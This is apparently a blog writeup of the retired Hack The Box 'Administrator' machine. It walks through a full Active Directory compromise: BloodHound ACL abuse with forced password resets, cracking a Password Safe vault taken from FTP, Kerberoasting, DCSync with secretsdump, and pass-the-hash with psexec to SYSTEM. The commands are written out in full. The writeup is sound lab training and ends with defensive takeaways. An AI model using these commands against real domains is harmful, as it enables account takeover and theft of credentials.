---
title: "Administrator — HackTheBox Writeup"
date: 2026-04-28
author: "Basil9099"
tags: ["HTB","Windows","Active Directory","BloodHound","Kerberos","DCSync","Impacket","nxc","Privilege Escalation"]
categories: ["CTF Writeups"]
summary: "Provided creds → BloodHound ACL chain (Olivia → Michael → Benjamin) → FTP .psafe3 backup → Emily → Ethan DCSync → Administrator NTLM → SYSTEM via psexec.py."
images: ["/images/administrator/administrator.webp"]
cover:
  image: "/images/administrator/administrator.webp"
  alt: "Administrator HTB image"
  caption: "Administrator - CTF - Hack The Box"
  relative: true
  hidden: false

---

> ⚠️ **Spoiler warning**: This covers a retired HTB machine. This writeup documents my playthrough of the retired Hack The Box machine **Administrator**.

The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.

# Administrator (HTB) — Walkthrough

## Overview
- **Platform:** Hack The Box (retired)
- **Target OS:** Windows Server 2022 — Active Directory Domain Controller
- **Focus:** AD enumeration → BloodHound ACL abuse (ForceChangePassword chain) → FTP loot → Password Safe cracking → DCSync → SYSTEM
- **Difficulty:** Medium

---

## Recon

Initial scan:

```bash
nmap -sV -sC -oN scans/administrator-initial 10.129.x.x
```

**Result highlights (relevant lines)**

53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldapssl
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  ldapssl       Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI (WinRM)

The full Kerberos + LDAP + Global-Catalog set confirms this host is a **Domain Controller**. The TLS certificate on 636/3269 disclosed the domain (`administrator.htb`) and the DC hostname.

![Nmap output showing AD service set on the DC](/images/administrator/nmap.png)

---

## Initial credentials & domain enumeration

The box description provides a starting credential:

```text
olivia : ichliebedich
```

Validate against SMB:

```bash
nxc smb 10.129.x.x -u olivia -p 'ichliebedich'
```

`[+] administrator.htb\olivia:ichliebedich` confirms the creds and that `olivia` is a valid domain user.

![nxc smb confirming Olivia's credentials](/images/administrator/nxc_smb_olivia.png)

Pull the domain user list over LDAP for later targeting:

```bash
nxc ldap 10.129.x.x -u olivia -p 'ichliebedich' --users
```

Notable accounts: `olivia`, `michael`, `benjamin`, `emily`, `ethan`, `alexander`, `Administrator`, plus the usual built-ins.

![nxc ldap dumping domain users](/images/administrator/nxc_ldap_users.png)

---

## BloodHound collection & ACL chain

Collect with `bloodhound-python` directly against the DC:

```bash
bloodhound-python -d administrator.htb -u olivia -p 'ichliebedich' \
  -ns 10.129.x.x -c All --zip
```

Import the zip into BloodHound CE and mark `olivia` as **Owned**. Running **Shortest Paths from Owned Principals** surfaces a clean ACL chain:

```text
OLIVIA --[GenericAll / ForceChangePassword]--> MICHAEL
MICHAEL --[ForceChangePassword]-->  BENJAMIN
```

The chain is the intended foothold ladder — abuse `ForceChangePassword` twice to land as **Benjamin**, who has access we don't.

![BloodHound graph: Olivia → Michael → Benjamin](/images/administrator/bloodhound_path.png)

---

## ForceChangePassword: Olivia → Michael

`ForceChangePassword` lets the principal reset the target's password without knowing the current one. From Linux this is straightforward over SAMR:

```bash
net rpc password 'michael' 'NewP@ssw0rd!1' -U 'administrator.htb/olivia%ichliebedich' -S 10.129.x.x
```

Validate the new credential immediately:

```bash
nxc smb 10.129.x.x -u michael -p 'NewP@ssw0rd!1'
```

![ForceChangePassword reset of Michael's password](/images/administrator/forcechangepassword_michael.png)

![nxc smb confirming Michael's new credential](/images/administrator/nxc_smb_michael.png)

If you prefer running this from a Windows beachhead with PowerView:

```powershell
$pw = ConvertTo-SecureString 'NewP@ssw0rd!1' -AsPlainText -Force
Set-DomainUserPassword -Identity michael -AccountPassword $pw
```

---

## ForceChangePassword: Michael → Benjamin

Repeat the exact same primitive one hop down the chain — this time as **Michael** against **Benjamin**:

```bash
net rpc password 'benjamin' 'NewP@ssw0rd!2' -U 'administrator.htb/michael%NewP@ssw0rd!1' -S 10.129.x.x
```

```bash
nxc smb 10.129.x.x -u benjamin -p 'NewP@ssw0rd!2'
```

![ForceChangePassword reset of Benjamin's password](/images/administrator/forcechangepassword_benjamin.png)

---

## FTP foothold as Benjamin

Benjamin is permitted on the FTP service (port 21) — that's the reason the chain ends here:

```bash
ftp 10.129.x.x
# Name: benjamin
# Password: NewP@ssw0rd!2
ftp> ls
ftp> binary
ftp> get Backup.psafe3
ftp> bye
```

A single artifact drops out — `Backup.psafe3`, a [Password Safe v3](https://pwsafe.org/) encrypted vault.

![FTP login as Benjamin and pulling the .psafe3 backup](/images/administrator/ftp_benjamin.png)

![Backup.psafe3 download confirmation](/images/administrator/psafe_download.png)

---

## Cracking the Password Safe vault

Convert the vault to a John-readable hash, then brute-force with rockyou:

```bash
pwsafe2john Backup.psafe3 > psafe.hash
john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
```

![pwsafe2john extracting the hash](/images/administrator/pwsafe2john.png)

![John cracking the vault password](/images/administrator/john_crack.png)

Open the vault with the cracked passphrase — the relevant entry inside is **Emily**'s domain credential. (Other vault entries redacted in the screenshot.)

```bash
pwsafe Backup.psafe3
```

![Password Safe vault open showing Emily's entry](/images/administrator/pwsafe_open.png)

Validate Emily's creds:

```bash
nxc smb 10.129.x.x -u emily -p '<emily-password>'
```

---

## Privilege escalation: Emily → Ethan

Re-running BloodHound with **Emily** marked as Owned shows the next edge:

```text
EMILY --[GenericWrite / WriteOwner]--> ETHAN
```

Ethan is the interesting target because he holds **DCSync rights** (`GetChanges` + `GetChangesAll` on the domain object). Two routes work; I took Kerberoasting first because Ethan exposed an SPN:

```bash
impacket-GetUserSPNs administrator.htb/emily:'<emily-password>' \
  -dc-ip 10.129.x.x -request -outputfile ethan.spn
john --wordlist=/usr/share/wordlists/rockyou.txt ethan.spn
```

![GetUserSPNs / ACL path to Ethan](/images/administrator/kerberoast_or_acl_ethan.png)

---

## DCSync as Ethan

Once you hold Ethan's password (or NT hash), the domain is effectively owned. Replicate the `Administrator` secret directly off the DC:

```bash
impacket-secretsdump administrator.htb/ethan:'<ethan-password>'@10.129.x.x -just-dc-user Administrator
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::
```

(All other principals omitted from the screenshot.)

![secretsdump returning the Administrator NTLM hash](/images/administrator/secretsdump_dcsync.png)

---

## SYSTEM shell & root flag

Pass-the-hash into a SYSTEM shell with `psexec.py`:

```bash
impacket-psexec administrator.htb/Administrator@10.129.x.x -hashes :<NTLM>
```

```interactive shell
C:\Windows\system32> whoami
nt authority\system
```

![psexec.py landing as nt authority\system](/images/administrator/psexec_system.png)

**Root flag:**

```interactive shell
C:\Users\Administrator\Desktop> type root.txt
```

"<root-flag-here>"

![Root flag](/images/administrator/root_flag.png)

---

## User flag

```interactive shell
C:\Users\Olivia\Desktop> type user.txt
```

"<user-flag-here>"

![User flag](/images/administrator/user_flag.png)

---

## Takeaways

- **BloodHound is the map.** The `Olivia → Michael → Benjamin` chain is invisible from raw `net user` output — only an ACL graph surfaces it.
- **`ForceChangePassword` is a sleeper privilege.** It looks innocuous in raw ACL output but is a complete account takeover primitive. Audit who can reset whom in your own AD.
- **Backups leak credentials.** A Password Safe file on FTP is the canonical example — backup pipelines need the same scrutiny as production secrets stores.
- **DCSync is the AD endgame.** Any principal with `GetChanges` + `GetChangesAll` on the domain object can replicate `krbtgt` and `Administrator` — treat those rights as Tier-0.
- **Chain, don't tunnel.** Each hop here was small (one ACL edge, one cracked file). The compromise emerges from chaining them, which is exactly how real AD breaches look.

---

## Resources

- [BloodHound CE — SpecterOps](https://bloodhound.specterops.io/)
- [Impacket](https://github.com/fortra/impacket) — `GetUserSPNs.py`, `secretsdump.py`, `psexec.py`
- [Password Safe](https://pwsafe.org/) and `pwsafe2john` (John the Ripper jumbo)
- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
- Hack The Box — retired machines archive
